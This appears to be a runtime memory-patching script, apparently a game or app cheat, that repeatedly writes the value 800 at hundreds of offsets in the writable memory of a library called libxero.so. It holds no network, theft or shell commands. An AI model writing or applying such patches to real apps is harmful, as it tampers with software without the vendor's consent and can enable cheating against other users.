Modify(Read('libxero.so','rw-p')+0x8c6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8cac,800,4)
Modify(Read('libxero.so','rw-p')+0x8cbc,800,4)
Modify(Read('libxero.so','rw-p')+0x8ccc,800,4)
Modify(Read('libxero.so','rw-p')+0x8cdc,800,4)
Modify(Read('libxero.so','rw-p')+0x8cec,800,4)
Modify(Read('libxero.so','rw-p')+0x8cfc,800,4)
Modify(Read('libxero.so','rw-p')+0x8d0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d5c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d88,800,4)
Modify(Read('libxero.so','rw-p')+0x8d8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8d90,800,4)
Modify(Read('libxero.so','rw-p')+0x8d94,800,4)
Modify(Read('libxero.so','rw-p')+0x8d9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8dac,800,4)
Modify(Read('libxero.so','rw-p')+0x8dbc,800,4)
Modify(Read('libxero.so','rw-p')+0x8dcc,800,4)
Modify(Read('libxero.so','rw-p')+0x8ddc,800,4)
Modify(Read('libxero.so','rw-p')+0x8dec,800,4)
Modify(Read('libxero.so','rw-p')+0x8dfc,800,4)
Modify(Read('libxero.so','rw-p')+0x8e0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e5c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8e9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8eac,800,4)
Modify(Read('libxero.so','rw-p')+0x8ebc,800,4)
Modify(Read('libxero.so','rw-p')+0x8ecc,800,4)
Modify(Read('libxero.so','rw-p')+0x8edc,800,4)
Modify(Read('libxero.so','rw-p')+0x8eec,800,4)
Modify(Read('libxero.so','rw-p')+0x8efc,800,4)
Modify(Read('libxero.so','rw-p')+0x8f0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f5c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8f9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8fac,800,4)
Modify(Read('libxero.so','rw-p')+0x8fbc,800,4)
Modify(Read('libxero.so','rw-p')+0x8fcc,800,4)
Modify(Read('libxero.so','rw-p')+0x8fdc,800,4)
Modify(Read('libxero.so','rw-p')+0x8fec,800,4)
Modify(Read('libxero.so','rw-p')+0x8ffc,800,4)
Modify(Read('libxero.so','rw-p')+0x900c,800,4)
Modify(Read('libxero.so','rw-p')+0x901c,800,4)
Modify(Read('libxero.so','rw-p')+0x902c,800,4)
Modify(Read('libxero.so','rw-p')+0x903c,800,4)
Modify(Read('libxero.so','rw-p')+0x904c,800,4)
Modify(Read('libxero.so','rw-p')+0x905c,800,4)
Modify(Read('libxero.so','rw-p')+0x906c,800,4)
Modify(Read('libxero.so','rw-p')+0x907c,800,4)
Modify(Read('libxero.so','rw-p')+0x908c,800,4)
Modify(Read('libxero.so','rw-p')+0x909c,800,4)
Modify(Read('libxero.so','rw-p')+0x90ac,800,4)
Modify(Read('libxero.so','rw-p')+0x90bc,800,4)
Modify(Read('libxero.so','rw-p')+0x90cc,800,4)
Modify(Read('libxero.so','rw-p')+0x90dc,800,4)
Modify(Read('libxero.so','rw-p')+0x90ec,800,4)
Modify(Read('libxero.so','rw-p')+0x90fc,800,4)
Modify(Read('libxero.so','rw-p')+0x910c,800,4)
Modify(Read('libxero.so','rw-p')+0x911c,800,4)
Modify(Read('libxero.so','rw-p')+0x912c,800,4)
Modify(Read('libxero.so','rw-p')+0x913c,800,4)
Modify(Read('libxero.so','rw-p')+0x914c,800,4)
Modify(Read('libxero.so','rw-p')+0x915c,800,4)
Modify(Read('libxero.so','rw-p')+0x916c,800,4)
Modify(Read('libxero.so','rw-p')+0x917c,800,4)
Modify(Read('libxero.so','rw-p')+0x918c,800,4)
Modify(Read('libxero.so','rw-p')+0x919c,800,4)
Modify(Read('libxero.so','rw-p')+0x91a8,800,4)
Modify(Read('libxero.so','rw-p')+0x91ac,800,4)
Modify(Read('libxero.so','rw-p')+0x91b0,800,4)
Modify(Read('libxero.so','rw-p')+0x91b4,800,4)
Modify(Read('libxero.so','rw-p')+0x91bc,800,4)
Modify(Read('libxero.so','rw-p')+0x91cc,800,4)
Modify(Read('libxero.so','rw-p')+0x91dc,800,4)
Modify(Read('libxero.so','rw-p')+0x91ec,800,4)
Modify(Read('libxero.so','rw-p')+0x91fc,800,4)
Modify(Read('libxero.so','rw-p')+0x920c,800,4)
Modify(Read('libxero.so','rw-p')+0x921c,800,4)
Modify(Read('libxero.so','rw-p')+0x922c,800,4)
Modify(Read('libxero.so','rw-p')+0x923c,800,4)
Modify(Read('libxero.so','rw-p')+0x924c,800,4)
Modify(Read('libxero.so','rw-p')+0x925c,800,4)
Modify(Read('libxero.so','rw-p')+0x926c,800,4)
Modify(Read('libxero.so','rw-p')+0x927c,800,4)
Modify(Read('libxero.so','rw-p')+0x928c,800,4)
Modify(Read('libxero.so','rw-p')+0x929c,800,4)
Modify(Read('libxero.so','rw-p')+0x92ac,800,4)
Modify(Read('libxero.so','rw-p')+0x92bc,800,4)
Modify(Read('libxero.so','rw-p')+0x92cc,800,4)
Modify(Read('libxero.so','rw-p')+0x92dc,800,4)
Modify(Read('libxero.so','rw-p')+0x92ec,800,4)
Modify(Read('libxero.so','rw-p')+0x92fc,800,4)
Modify(Read('libxero.so','rw-p')+0x930c,800,4)
Modify(Read('libxero.so','rw-p')+0x931c,800,4)
Modify(Read('libxero.so','rw-p')+0x932c,800,4)
Modify(Read('libxero.so','rw-p')+0x933c,800,4)
Modify(Read('libxero.so','rw-p')+0x934c,800,4)
Modify(Read('libxero.so','rw-p')+0x935c,800,4)
Modify(Read('libxero.so','rw-p')+0x936c,800,4)
Modify(Read('libxero.so','rw-p')+0x937c,800,4)
Modify(Read('libxero.so','rw-p')+0x938c,800,4)
Modify(Read('libxero.so','rw-p')+0x939c,800,4)
Modify(Read('libxero.so','rw-p')+0x93ac,800,4)
Modify(Read('libxero.so','rw-p')+0x93bc,800,4)
Modify(Read('libxero.so','rw-p')+0x93cc,800,4)
Modify(Read('libxero.so','rw-p')+0x93dc,800,4)
Modify(Read('libxero.so','rw-p')+0x93ec,800,4)
Modify(Read('libxero.so','rw-p')+0x93fc,800,4)
Modify(Read('libxero.so','rw-p')+0x940c,800,4)
Modify(Read('libxero.so','rw-p')+0x941c,800,4)
Modify(Read('libxero.so','rw-p')+0x942c,800,4)
Modify(Read('libxero.so','rw-p')+0x943c,800,4)
Modify(Read('libxero.so','rw-p')+0x944c,800,4)
Modify(Read('libxero.so','rw-p')+0x945c,800,4)
Modify(Read('libxero.so','rw-p')+0x946c,800,4)
Modify(Read('libxero.so','rw-p')+0x947c,800,4)
Modify(Read('libxero.so','rw-p')+0x948c,800,4)
Modify(Read('libxero.so','rw-p')+0x949c,800,4)
Modify(Read('libxero.so','rw-p')+0x94ac,800,4)
Modify(Read('libxero.so','rw-p')+0x94bc,800,4)
Modify(Read('libxero.so','rw-p')+0x94cc,800,4)
Modify(Read('libxero.so','rw-p')+0x94dc,800,4)
Modify(Read('libxero.so','rw-p')+0x94ec,800,4)
Modify(Read('libxero.so','rw-p')+0x94fc,800,4)
Modify(Read('libxero.so','rw-p')+0x950c,800,4)
Modify(Read('libxero.so','rw-p')+0x951c,800,4)
Modify(Read('libxero.so','rw-p')+0x952c,800,4)
Modify(Read('libxero.so','rw-p')+0x953c,800,4)
Modify(Read('libxero.so','rw-p')+0x954c,800,4)
Modify(Read('libxero.so','rw-p')+0x955c,800,4)
Modify(Read('libxero.so','rw-p')+0x956c,800,4)
Modify(Read('libxero.so','rw-p')+0x957c,800,4)
Modify(Read('libxero.so','rw-p')+0x958c,800,4)
Modify(Read('libxero.so','rw-p')+0x959c,800,4)
Modify(Read('libxero.so','rw-p')+0x95ac,800,4)
Modify(Read('libxero.so','rw-p')+0x95bc,800,4)
Modify(Read('libxero.so','rw-p')+0x95cc,800,4)
Modify(Read('libxero.so','rw-p')+0x95dc,800,4)
Modify(Read('libxero.so','rw-p')+0x95ec,800,4)
Modify(Read('libxero.so','rw-p')+0x95fc,800,4)
Modify(Read('libxero.so','rw-p')+0x960c,800,4)
Modify(Read('libxero.so','rw-p')+0x961c,800,4)
Modify(Read('libxero.so','rw-p')+0x962c,800,4)
Modify(Read('libxero.so','rw-p')+0x963c,800,4)
Modify(Read('libxero.so','rw-p')+0x964c,800,4)
Modify(Read('libxero.so','rw-p')+0x965c,800,4)
Modify(Read('libxero.so','rw-p')+0x966c,800,4)
Modify(Read('libxero.so','rw-p')+0x967c,800,4)
Modify(Read('libxero.so','rw-p')+0x968c,800,4)
Modify(Read('libxero.so','rw-p')+0x969c,800,4)
Modify(Read('libxero.so','rw-p')+0x96ac,800,4)
Modify(Read('libxero.so','rw-p')+0x96bc,800,4)
Modify(Read('libxero.so','rw-p')+0x96cc,800,4)
Modify(Read('libxero.so','rw-p')+0x96dc,800,4)
Modify(Read('libxero.so','rw-p')+0x96ec,800,4)
Modify(Read('libxero.so','rw-p')+0x96fc,800,4)
Modify(Read('libxero.so','rw-p')+0x970c,800,4)
Modify(Read('libxero.so','rw-p')+0x971c,800,4)
Modify(Read('libxero.so','rw-p')+0x972c,800,4)
Modify(Read('libxero.so','rw-p')+0x973c,800,4)
Modify(Read('libxero.so','rw-p')+0x974c,800,4)
Modify(Read('libxero.so','rw-p')+0x975c,800,4)
Modify(Read('libxero.so','rw-p')+0x976c,800,4)
Modify(Read('libxero.so','rw-p')+0x977c,800,4)
Modify(Read('libxero.so','rw-p')+0x978c,800,4)
Modify(Read('libxero.so','rw-p')+0x979c,800,4)
Modify(Read('libxero.so','rw-p')+0x97ac,800,4)
Modify(Read('libxero.so','rw-p')+0x97b8,800,4)
Modify(Read('libxero.so','rw-p')+0x97bc,800,4)
Modify(Read('libxero.so','rw-p')+0x97c0,800,4)
Modify(Read('libxero.so','rw-p')+0x97c4,800,4)
Modify(Read('libxero.so','rw-p')+0x97cc,800,4)
Modify(Read('libxero.so','rw-p')+0x97dc,800,4)
Modify(Read('libxero.so','rw-p')+0x97ec,800,4)
Modify(Read('libxero.so','rw-p')+0x97fc,800,4)
Modify(Read('libxero.so','rw-p')+0x980c,800,4)
Modify(Read('libxero.so','rw-p')+0x981c,800,4)
Modify(Read('libxero.so','rw-p')+0x982c,800,4)
Modify(Read('libxero.so','rw-p')+0x983c,800,4)
Modify(Read('libxero.so','rw-p')+0x984c,800,4)
Modify(Read('libxero.so','rw-p')+0x985c,800,4)
Modify(Read('libxero.so','rw-p')+0x986c,800,4)
Modify(Read('libxero.so','rw-p')+0x987c,800,4)
Modify(Read('libxero.so','rw-p')+0x988c,800,4)
Modify(Read('libxero.so','rw-p')+0x989c,800,4)
Modify(Read('libxero.so','rw-p')+0x98ac,800,4)
Modify(Read('libxero.so','rw-p')+0x98bc,800,4)
Modify(Read('libxero.so','rw-p')+0x98cc,800,4)
Modify(Read('libxero.so','rw-p')+0x98dc,800,4)
Modify(Read('libxero.so','rw-p')+0x98ec,800,4)
Modify(Read('libxero.so','rw-p')+0x98fc,800,4)
Modify(Read('libxero.so','rw-p')+0x990c,800,4)
Modify(Read('libxero.so','rw-p')+0x991c,800,4)
Modify(Read('libxero.so','rw-p')+0x992c,800,4)
Modify(Read('libxero.so','rw-p')+0x993c,800,4)
Modify(Read('libxero.so','rw-p')+0x994c,800,4)
Modify(Read('libxero.so','rw-p')+0x995c,800,4)
Modify(Read('libxero.so','rw-p')+0x996c,800,4)
Modify(Read('libxero.so','rw-p')+0x997c,800,4)
Modify(Read('libxero.so','rw-p')+0x998c,800,4)
Modify(Read('libxero.so','rw-p')+0x999c,800,4)
Modify(Read('libxero.so','rw-p')+0x99ac,800,4)
Modify(Read('libxero.so','rw-p')+0x99bc,800,4)
Modify(Read('libxero.so','rw-p')+0x99cc,800,4)
Modify(Read('libxero.so','rw-p')+0x99dc,800,4)
Modify(Read('libxero.so','rw-p')+0x99ec,800,4)
Modify(Read('libxero.so','rw-p')+0x99fc,800,4)
Modify(Read('libxero.so','rw-p')+0x9a0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9a9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9aac,800,4)
Modify(Read('libxero.so','rw-p')+0x9abc,800,4)
Modify(Read('libxero.so','rw-p')+0x9acc,800,4)
Modify(Read('libxero.so','rw-p')+0x9adc,800,4)
Modify(Read('libxero.so','rw-p')+0x9aec,800,4)
Modify(Read('libxero.so','rw-p')+0x9afc,800,4)
Modify(Read('libxero.so','rw-p')+0x9b0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9b9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9bac,800,4)
Modify(Read('libxero.so','rw-p')+0x9bbc,800,4)
Modify(Read('libxero.so','rw-p')+0x9bcc,800,4)
Modify(Read('libxero.so','rw-p')+0x9bdc,800,4)
Modify(Read('libxero.so','rw-p')+0x9bec,800,4)
Modify(Read('libxero.so','rw-p')+0x9bfc,800,4)
Modify(Read('libxero.so','rw-p')+0x9c0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9c9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9cac,800,4)
Modify(Read('libxero.so','rw-p')+0x9cbc,800,4)
Modify(Read('libxero.so','rw-p')+0x9ccc,800,4)
Modify(Read('libxero.so','rw-p')+0x9cdc,800,4)
Modify(Read('libxero.so','rw-p')+0x9cec,800,4)
Modify(Read('libxero.so','rw-p')+0x9cfc,800,4)
Modify(Read('libxero.so','rw-p')+0x9d0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9d9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9dac,800,4)
Modify(Read('libxero.so','rw-p')+0x9dbc,800,4)
Modify(Read('libxero.so','rw-p')+0x9dcc,800,4)
Modify(Read('libxero.so','rw-p')+0x9ddc,800,4)
Modify(Read('libxero.so','rw-p')+0x9dec,800,4)
Modify(Read('libxero.so','rw-p')+0x9dfc,800,4)
Modify(Read('libxero.so','rw-p')+0x9e0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9e9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9ea8,800,4)
Modify(Read('libxero.so','rw-p')+0x9eac,800,4)
Modify(Read('libxero.so','rw-p')+0x9eb0,800,4)
Modify(Read('libxero.so','rw-p')+0x9eb4,800,4)
Modify(Read('libxero.so','rw-p')+0x9ebc,800,4)
Modify(Read('libxero.so','rw-p')+0x9ecc,800,4)
Modify(Read('libxero.so','rw-p')+0x9edc,800,4)
Modify(Read('libxero.so','rw-p')+0x9eec,800,4)
Modify(Read('libxero.so','rw-p')+0x9efc,800,4)
Modify(Read('libxero.so','rw-p')+0x9f0c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f18,800,4)
Modify(Read('libxero.so','rw-p')+0x9f1c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f20,800,4)
Modify(Read('libxero.so','rw-p')+0x9f24,800,4)
Modify(Read('libxero.so','rw-p')+0x9f2c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f3c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f4c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f5c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f68,800,4)
Modify(Read('libxero.so','rw-p')+0x9f6c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f70,800,4)
Modify(Read('libxero.so','rw-p')+0x9f74,800,4)
Modify(Read('libxero.so','rw-p')+0x9f7c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f8c,800,4)
Modify(Read('libxero.so','rw-p')+0x9f9c,800,4)
Modify(Read('libxero.so','rw-p')+0x9fac,800,4)
Modify(Read('libxero.so','rw-p')+0x9fbc,800,4)
Modify(Read('libxero.so','rw-p')+0x9fcc,800,4)
Modify(Read('libxero.so','rw-p')+0x9fdc,800,4)
Modify(Read('libxero.so','rw-p')+0x9fec,800,4)
Modify(Read('libxero.so','rw-p')+0x9ffc,800,4)
Modify(Read('libxero.so','rw-p')+0xa00c,800,4)
Modify(Read('libxero.so','rw-p')+0xa01c,800,4)
Modify(Read('libxero.so','rw-p')+0xa02c,800,4)
Modify(Read('libxero.so','rw-p')+0xa03c,800,4)
Modify(Read('libxero.so','rw-p')+0xa04c,800,4)
Modify(Read('libxero.so','rw-p')+0xa05c,800,4)
Modify(Read('libxero.so','rw-p')+0xa06c,800,4)
Modify(Read('libxero.so','rw-p')+0xa07c,800,4)
Modify(Read('libxero.so','rw-p')+0xa08c,800,4)
Modify(Read('libxero.so','rw-p')+0xa09c,800,4)
Modify(Read('libxero.so','rw-p')+0xa0ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa0bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa0cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa0dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa0ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa0fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa10c,800,4)
Modify(Read('libxero.so','rw-p')+0xa11c,800,4)
Modify(Read('libxero.so','rw-p')+0xa12c,800,4)
Modify(Read('libxero.so','rw-p')+0xa13c,800,4)
Modify(Read('libxero.so','rw-p')+0xa14c,800,4)
Modify(Read('libxero.so','rw-p')+0xa15c,800,4)
Modify(Read('libxero.so','rw-p')+0xa16c,800,4)
Modify(Read('libxero.so','rw-p')+0xa17c,800,4)
Modify(Read('libxero.so','rw-p')+0xa18c,800,4)
Modify(Read('libxero.so','rw-p')+0xa19c,800,4)
Modify(Read('libxero.so','rw-p')+0xa1ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa1bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa1cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa1dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa1ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa1f8,800,4)
Modify(Read('libxero.so','rw-p')+0xa1fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa200,800,4)
Modify(Read('libxero.so','rw-p')+0xa204,800,4)
Modify(Read('libxero.so','rw-p')+0xa20c,800,4)
Modify(Read('libxero.so','rw-p')+0xa21c,800,4)
Modify(Read('libxero.so','rw-p')+0xa22c,800,4)
Modify(Read('libxero.so','rw-p')+0xa23c,800,4)
Modify(Read('libxero.so','rw-p')+0xa24c,800,4)
Modify(Read('libxero.so','rw-p')+0xa25c,800,4)
Modify(Read('libxero.so','rw-p')+0xa26c,800,4)
Modify(Read('libxero.so','rw-p')+0xa27c,800,4)
Modify(Read('libxero.so','rw-p')+0xa28c,800,4)
Modify(Read('libxero.so','rw-p')+0xa29c,800,4)
Modify(Read('libxero.so','rw-p')+0xa2ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa2bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa2cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa2dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa2ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa2fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa30c,800,4)
Modify(Read('libxero.so','rw-p')+0xa31c,800,4)
Modify(Read('libxero.so','rw-p')+0xa32c,800,4)
Modify(Read('libxero.so','rw-p')+0xa33c,800,4)
Modify(Read('libxero.so','rw-p')+0xa34c,800,4)
Modify(Read('libxero.so','rw-p')+0xa35c,800,4)
Modify(Read('libxero.so','rw-p')+0xa36c,800,4)
Modify(Read('libxero.so','rw-p')+0xa37c,800,4)
Modify(Read('libxero.so','rw-p')+0xa38c,800,4)
Modify(Read('libxero.so','rw-p')+0xa39c,800,4)
Modify(Read('libxero.so','rw-p')+0xa3ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa3bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa3cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa3dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa3ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa3fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa40c,800,4)
Modify(Read('libxero.so','rw-p')+0xa41c,800,4)
Modify(Read('libxero.so','rw-p')+0xa42c,800,4)
Modify(Read('libxero.so','rw-p')+0xa43c,800,4)
Modify(Read('libxero.so','rw-p')+0xa448,800,4)
Modify(Read('libxero.so','rw-p')+0xa44c,800,4)
Modify(Read('libxero.so','rw-p')+0xa450,800,4)
Modify(Read('libxero.so','rw-p')+0xa454,800,4)
Modify(Read('libxero.so','rw-p')+0xa45c,800,4)
Modify(Read('libxero.so','rw-p')+0xa46c,800,4)
Modify(Read('libxero.so','rw-p')+0xa47c,800,4)
Modify(Read('libxero.so','rw-p')+0xa48c,800,4)
Modify(Read('libxero.so','rw-p')+0xa49c,800,4)
Modify(Read('libxero.so','rw-p')+0xa4ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa4bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa4cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa4dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa4ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa4fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa50c,800,4)
Modify(Read('libxero.so','rw-p')+0xa51c,800,4)
Modify(Read('libxero.so','rw-p')+0xa52c,800,4)
Modify(Read('libxero.so','rw-p')+0xa53c,800,4)
Modify(Read('libxero.so','rw-p')+0xa54c,800,4)
Modify(Read('libxero.so','rw-p')+0xa55c,800,4)
Modify(Read('libxero.so','rw-p')+0xa56c,800,4)
Modify(Read('libxero.so','rw-p')+0xa57c,800,4)
Modify(Read('libxero.so','rw-p')+0xa58c,800,4)
Modify(Read('libxero.so','rw-p')+0xa59c,800,4)
Modify(Read('libxero.so','rw-p')+0xa5ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa5bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa5cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa5dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa5ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa5fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa60c,800,4)
Modify(Read('libxero.so','rw-p')+0xa61c,800,4)
Modify(Read('libxero.so','rw-p')+0xa62c,800,4)
Modify(Read('libxero.so','rw-p')+0xa63c,800,4)
Modify(Read('libxero.so','rw-p')+0xa64c,800,4)
Modify(Read('libxero.so','rw-p')+0xa65c,800,4)
Modify(Read('libxero.so','rw-p')+0xa66c,800,4)
Modify(Read('libxero.so','rw-p')+0xa67c,800,4)
Modify(Read('libxero.so','rw-p')+0xa68c,800,4)
Modify(Read('libxero.so','rw-p')+0xa69c,800,4)
Modify(Read('libxero.so','rw-p')+0xa6ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa6bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa6cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa6dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa6ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa6fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa70c,800,4)
Modify(Read('libxero.so','rw-p')+0xa718,800,4)
Modify(Read('libxero.so','rw-p')+0xa71c,800,4)
Modify(Read('libxero.so','rw-p')+0xa720,800,4)
Modify(Read('libxero.so','rw-p')+0xa724,800,4)
Modify(Read('libxero.so','rw-p')+0xa72c,800,4)
Modify(Read('libxero.so','rw-p')+0xa73c,800,4)
Modify(Read('libxero.so','rw-p')+0xa74c,800,4)
Modify(Read('libxero.so','rw-p')+0xa75c,800,4)
Modify(Read('libxero.so','rw-p')+0xa76c,800,4)
Modify(Read('libxero.so','rw-p')+0xa77c,800,4)
Modify(Read('libxero.so','rw-p')+0xa78c,800,4)
Modify(Read('libxero.so','rw-p')+0xa79c,800,4)
Modify(Read('libxero.so','rw-p')+0xa7ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa7bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa7cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa7dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa7ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa7fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa80c,800,4)
Modify(Read('libxero.so','rw-p')+0xa81c,800,4)
Modify(Read('libxero.so','rw-p')+0xa82c,800,4)
Modify(Read('libxero.so','rw-p')+0xa83c,800,4)
Modify(Read('libxero.so','rw-p')+0xa84c,800,4)
Modify(Read('libxero.so','rw-p')+0xa85c,800,4)
Modify(Read('libxero.so','rw-p')+0xa868,800,4)
Modify(Read('libxero.so','rw-p')+0xa86c,800,4)
Modify(Read('libxero.so','rw-p')+0xa870,800,4)
Modify(Read('libxero.so','rw-p')+0xa874,800,4)
Modify(Read('libxero.so','rw-p')+0xa87c,800,4)
Modify(Read('libxero.so','rw-p')+0xa88c,800,4)
Modify(Read('libxero.so','rw-p')+0xa89c,800,4)
Modify(Read('libxero.so','rw-p')+0xa8a8,800,4)
Modify(Read('libxero.so','rw-p')+0xa8ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa8b0,800,4)
Modify(Read('libxero.so','rw-p')+0xa8b4,800,4)
Modify(Read('libxero.so','rw-p')+0xa8bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa8cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa8dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa8ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa8fc,800,4)
Modify(Read('libxero.so','rw-p')+0xa90c,800,4)
Modify(Read('libxero.so','rw-p')+0xa91c,800,4)
Modify(Read('libxero.so','rw-p')+0xa92c,800,4)
Modify(Read('libxero.so','rw-p')+0xa93c,800,4)
Modify(Read('libxero.so','rw-p')+0xa94c,800,4)
Modify(Read('libxero.so','rw-p')+0xa95c,800,4)
